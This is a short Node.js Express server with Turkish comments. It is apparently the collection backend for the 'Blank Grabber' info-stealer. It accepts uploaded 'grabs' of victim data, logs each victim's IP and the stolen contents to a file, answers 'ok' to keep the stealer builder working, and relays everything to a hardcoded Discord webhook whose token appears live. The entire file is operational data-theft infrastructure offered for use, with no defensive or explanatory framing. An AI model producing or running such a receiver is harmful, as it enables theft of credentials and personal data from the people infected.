const express = require('express');
const fetch = require('node-fetch');
const fs = require('fs');
const app = express();

app.use(express.json({limit:'100mb'}));
app.use(express.raw({limit:'100mb'}));
app.use(express.text({limit:'100mb'}));

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1447266656823939074/L6bY8dExY7Jv2jSspSGNVQTVnMsTZmZ14TzXuJV-MOais4tdIjrrcUirBT9OA5xeHiey';

app.all('/', async (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || 'unknown';
    const zaman = new Date().toLocaleString('tr-TR');
    let veri = typeof req.body === 'object' ? JSON.stringify(req.body, null, 2) : req.body?.toString() || 'boş';

    const log = `\n\n╔══════════════════╗\n║ YENİ GRAB GELDİ! ║\n╚══════════════════╝\n⏰ ${zaman}\n🌍 IP: ${ip}\n📦 VERİ:\n${veri}\n`;
    fs.appendFileSync('logs.txt', log);
    console.log(log);

    // Blank Grabber’a "ok" de (builder mutlu olsun)
    res.send('ok');

    // Aynı veriyi Discord’a da gönder (builder hata vermesin diye)
    try {
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: 'Yeni grab geldi!',
                embeds: [{ description: `**IP:** ${ip}\n\`\`\`json\n${veri}\n\`\`\``, color: 0x00ff00 }]
            })
        });
    } catch (e) {}
});

app.listen(process.env.PORT || 3000);
